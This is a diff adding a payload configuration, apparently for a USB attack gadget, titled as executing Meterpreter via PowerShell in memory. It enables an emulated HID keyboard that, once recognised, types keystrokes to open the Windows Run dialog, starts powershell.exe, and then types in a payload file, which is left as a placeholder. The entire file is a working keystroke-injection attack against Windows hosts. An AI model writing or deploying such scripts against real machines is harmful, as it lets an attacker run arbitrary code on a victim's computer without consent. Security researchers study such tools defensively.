@@ -1,0 +1,34 @@
+# Execute Meterpreter via Powershell in memory
+
+# =============================
+# USB setup
+# =============================
+# Make sure to change USB_PID if you enable different USB functionality in order
+# to force Windows to enumerate the device again
+USB_VID="0x1d6b"        # Vendor ID
+USB_PID="0x110c"        # Product ID
+
+# Overwrite default settings (setup.cfg) for keyboard funtion
+USE_RNDIS=true          # if true RNDIS will be enabled
+USE_HID=true            # if true HID (keyboard) will be enabled
+
+
+
+# Payload configuration via HID interface
+
+function onKeyboardUp()
+{
+        # we need no initial keyboard delay, before starting the DuckyScript
+        # if this method gets called, we know the HID keyboard stack is usable
+
+        cat <<- EOF | duckhid
+				GUI r
+                DELAY 500
+                STRING powershell.exe
+                ENTER
+                DELAY 1000
+EOF
+        cat <payload> | outhid
+}
+
+
